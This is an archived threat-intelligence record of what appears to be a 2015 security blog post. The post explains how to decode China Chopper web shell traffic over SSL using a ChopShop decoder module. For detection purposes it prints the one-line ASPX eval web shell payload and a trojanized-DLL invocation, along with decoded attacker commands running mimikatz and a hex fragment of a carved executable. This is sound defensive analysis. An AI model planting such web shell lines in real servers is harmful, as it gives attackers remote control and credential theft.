{
    "id": "846e3ead-d45e-43ab-ba95-c1d09b6f9fa3",
    "created_at": "2022-10-25T16:48:12.618522Z",
    "updated_at": "2025-03-27T02:05:56.571195Z",
    "deleted_at": null,
    "sha1_hash": "b3ad6d13b10de19e232342610370c47ac9083d0d",
    "title": "Chopping packets: Decoding China Chopper Web shell traffic over SSL » Adversary Manifesto",
    "authors": "",
    "file_creation_date": "2015-11-24T15:02:08Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 760759,
    "plain_text": "# Chopping packets: Decoding China Chopper Web shell traffic over SSL�\n\n**[THE FRONT LINES / THE TOOL BOX](http://blog.crowdstrike.com/category/the-front-lines/)** **30 MAR 2015** **[WILLIAM TAN](http://blog.crowdstrike.com/author/william-tan/)**\n\n**INTRODUCTION**\n\n**The Chopper Web shell is a widely used backdoor by Chinese and other malicious actors to**\n\n**remotely access a compromised Web server. Deployment of the Chopper shell on the server is**\n\n**fairly basic as the server payload is a single line inserted into any ASPX page.**\n\n**<%@ Page Language=\"Jscript\"%><%eval(Request.Item[”password\"],\"unsafe\");%>**\n\n**This payload is available in a variety of languages including ASP, ASPX, PHP, JSP, and CFM.**\n\n**Once installed, the attacker can access the shell with the Chopper client side binary.**\n\n**CrowdStrike has observed another deployment method on IIS servers where attackers upload a**\n\n**trojanized DLL file, ‘System.WebServices.dll’. This DLL file is written in C# and contains multiple�**\n\n**Chopper API functions. The attacker can then call these functions by inserting this line in any**\n\n**ASPX page:**\n\n**<% WebServices.InitalizeWebServices (\"shell_password\");%>**\n\n**The attacker can access this Web shell variant with similar methods, including using the Chopper**\n\n**client side binary. The benefit of this deployment method allows the Web shell to evade host-�**\n\n**based detection methods that look for suspicious functions such as ‘eval’. Although deployments**\n\n**of Chopper can vary on the host, the network traffic patterns generated by the Web shell have�**\n\n**remained largely unchanged.**\n\n**CHOPPER NETWORK TRAFFIC**\n\n**The Chopper Web shell client communicates over TCP using HTTP POST requests. Network**\n\n\n-----\n\n**tedious if the attacker is very active. Another challenge occurs when Chopper is deployed on a**\n\n**Web server behind SSL, causing all traffic generated by Chopper to be encrypted.�**\n\n**Figure 1. Example of Chopper’s encoded command with response over decrypted HTTPs**\n\n**DECODING WITH CHOPSHOP**\n\n**To assist with rapid triage, we leverage ChopShop, a network decoder framework developed by**\n\n**[MITRE (https://github.com/MITRECND/chopshop). The ChopShop framework is extendable with](http://github.com/MITRECND/chopshop)**\n\n**modules, and the output from each module can be chained. Doing so reduces the need to rewrite**\n\n**a decoder for widely used protocols. This allows the analyst to focus on developing modules**\n\n**specific to a family of malware without dealing with the underlying protocols.�**\n\n**The Chopper decode module I have written for the ChopShop Framework is designed to be**\n\n**chained with the ‘chop_ssl’ and ‘http’ modules. To decode SSL traffic, the ‘chop_ssl’ module�**\n\n**requires the server’s private key in RSA format. I’ve provided an initial version of this module on**\n\n**[our Github page (https://github.com/CrowdStrike/chopshop).](https://github.com/CrowdStrike/chopshop)**\n\n**webshell_chopper_decode (0.1) -- requires ChopLib 4.0 or greater:**\n\n\n-----\n\n**Usage: webshell_chopper_decode [options]**\n\n**Options:**\n\n**-h, --help      show this help message and exit**\n\n**-d, --dict_output  Formats output to sets of dicts**\n\n**-c, --commands_only Only output chopper commands**\n\n**-o, --outputs_only  Only output chopper responses**\n\n**-x, --extract_pe   Attempts to extract pe files from session**\n\n**Sample usage commands:**\n\n**./chopshop –f chopper_traffic_ssl.pcap \"chop_ssl -k privatekeyrsa.key | http |**\n\n**webshell_chopper_decode\" > decoded_commands.txt**\n\n**./chopshop –f chopper_traffic_http.pcap \"http | webshell_chopper_decode -c\"**\n\n**The module output contains all commands and responses from the Chopper shell. The module**\n\n**will decode the entire PCAP and separate the each command parameter ‘z0’, ‘z1’, ‘z2’ on a**\n\n**separate line. These ‘z’ parameters in the form data contain the arguments to commands , which**\n\n**are passed from the Chopper client to the server payload. While the commands are encoded in**\n\n**either base64 or hex, the responses are not encoded.**\n\n**In the sample output below, we see an attacker running a ‘dir’ command file looking for�**\n\n**‘w3wp.exe’ (a renamed version of cmd.exe) and subsequently executing the credential dumper**\n\n**‘mimikatz’ (named pwd.txt).**\n\n**Portable executable (PE) files used by the Chopper Web shell are parsed as hex encoded by the�**\n\n**module. The Chopper decode module has an option to attempt to carve out and save any PE files�**\n\n**in the commands or responses seen during an attacker’s C2 session.**\n\n**./chopshop -s . –f chopper_traffic_ssl.pcap \"chop_ssl -k privatekeyrsa.key | http |**\n\n**webshell_chopper_decode –x\"**\n\n**Note the addition of the “-s” flag, which needs to be set to tell ChopShop which directory to output�**\n\n**saved files.�**\n\n\n-----\n\n**Figure 2. Sample portion of output from decode module showing ‘mimikatz’ execution.**\n\n**…**\n\n**chopper_extracted_file-1.bin saved..**\n\n**[COMMAND] at 2015-02-24 07:03:05 UTC**\n\n**[Z0 Parameter] - Q1|**\n\n**[Z1 Parameter] -**\n\n**\\\\192.168.1.11\\c$\\inetpub\\wwwroot\\Citrix\\XenApp\\bin\\System.WebServices.dll**\n\n**[Z2 Parameter] -**\n\n**4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000**\n\n**0000000000000000000000000000000000000000000000000000800000000E1FBA0E**\n\n**00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F74206265207**\n\n**2756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103**\n\n**00D2963C500000000000000000E00002210B0108000036000000080000000000002**\n\n**E5500000020000000600000000040000020000000020000040000000000000004000**\n\n**0000000000000A000000002000000000000030040850000100000100000000010000**\n\n**010000000000000100000000000000000000000DC5400004F0000000060000008050**\n\n**00000000000000000000000000000000000008000000C000000445400001C0000000**\n\n**00000000000000000000000000000000000000000000000000000000000000000000**\n\n**0000000000000200000080000000…**\n\n\n-----\n\n**Figure 3. Carved PE from Chopper traffic opened in hex editor.�**\n\n**With Chopper available in so many varieties of programming and scripting languages, this module**\n\n**is still in development to account for different variants and edge cases. The goal of this module**\n\n**was to ease some of the tediousness of extracting information out of a large packet capture. With**\n\n**the prevalence of Chopper’s use by APT groups, being able to quickly decode and understand**\n\n**what an attacker is doing greatly increases the situational awareness of incident responders.**\n\n**REFERENCES**\n\n**[https://github.com/CrowdStrike/chopshop](https://github.com/CrowdStrike/chopshop)**\n\n**[https://github.com/MITRECND/chopshop](https://github.com/MITRECND/chopshop)**\n\n**[https://github.com/MITRECND/htpy](https://github.com/MITRECND/htpy)**\n\n**http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/decrypting-ssl-with-**\n\n**chopshop**\n\n**[https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf�](https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf)**\n\n**[http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html](http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html)**\n\n### 1 8\n\n## ← New White House Executive Order: The Future of Privacy, Data, and Cyber\n\n\n-----\n\n## Follow Us\n\n\n-----\n\n|Tweets|Col2|\n|---|---|\n|CrowdStrike 12h @CrowdStrike Check out @mediafishy� discuss the future of AV and why endpoint protection is paramount ow.ly/UZ12X #cybersecurity #infosec Show Media||\n|CrowdStrike 20 Nov @CrowdStrike Check out @Shawn365Henry's security tips in \"The Top 5 #Cybersecurity Mistakes Companies Make & How to Avoid Them\" ow.ly/USNQD Expand||\n|Eric Opdyke 20 Nov @EricOpdyke Got my sweet new @CrowdStrike Dead Eye Jackal shirt today #DFIR #malware #deadeyejackal pic.twitter.com/mihenWdbAa Retweeted by CrowdStrike Compose new Tweet… Recent Posts||\n|The Imperative for Proactive Incident Response in 2015 and Be|yond|\n\n\n**CrowdStrike** **12h**\n**@CrowdStrike**\n\n**Check out @mediafishy� discuss the future of AV and why endpoint protection is**\n**paramount ow.ly/UZ12X** **#cybersecurity** **#infosec**\n\n**Show Media**\n\n**CrowdStrike** **20 Nov**\n**@CrowdStrike**\n\n**Check out @Shawn365Henry's security tips in \"The Top 5 #Cybersecurity Mistakes**\n**Companies Make & How to Avoid Them\" ow.ly/USNQD**\n\n**Expand**\n\n**Eric Opdyke** **20 Nov**\n**@EricOpdyke**\n\n**Got my sweet new @CrowdStrike Dead Eye Jackal shirt today #DFIR** **#malware**\n**#deadeyejackal** **pic.twitter.com/mihenWdbAa**\n\n**Retweeted by CrowdStrike**\n\n**Compose new Tweet…**\n\n\n**Compose new Tweet…**\n\n## Recent Posts\n\n\n-----\n\n|M|T|W|T|F|S|S|\n|---|---|---|---|---|---|---|\n|||||||1|\n|2|3|4|5|6|7|8|\n|9|10|11|12|13|14|15|\n|16|17|18|19|20|21|22|\n|23|24|25|26|27|28|29|\n|30|||||||\n\n\n## Archives\n\n### N O V E M B E R 2 0 1 5\n\n**M** **T** **W** **T** **F** **S** **S**\n\n**1**\n\n**[2](http://blog.crowdstrike.com/2015/11/02/)** **[3](http://blog.crowdstrike.com/2015/11/03/)** **4** **5** **6** **7** **8**\n\n**9** **10** **11** **12** **[13](http://blog.crowdstrike.com/2015/11/13/)** **14** **15**\n\n**16** **17** **[18](http://blog.crowdstrike.com/2015/11/18/)** **19** **20** **21** **22**\n\n**23** **24** **25** **26** **27** **28** **29**\n\n**30**\n\n**[« Oct](http://blog.crowdstrike.com/2015/10/)**\n\n\n## Recent Comments\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.03.30.Decoding_China_Chopper/2015.03.30.crowdstrike.chopping-packets-decoding-china-chopper-web-shell-traffic-over-ssl.pdf"
    ],
    "report_names": [
        "2015.03.30.crowdstrike.chopping-packets-decoding-china-chopper-web-shell-traffic-over-ssl"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041156,
    "ts_creation_date": 1448377328,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/b3ad6d13b10de19e232342610370c47ac9083d0d.pdf",
        "text": "https://archive.orkl.eu/b3ad6d13b10de19e232342610370c47ac9083d0d.txt",
        "img": "https://archive.orkl.eu/b3ad6d13b10de19e232342610370c47ac9083d0d.jpg"
    }
}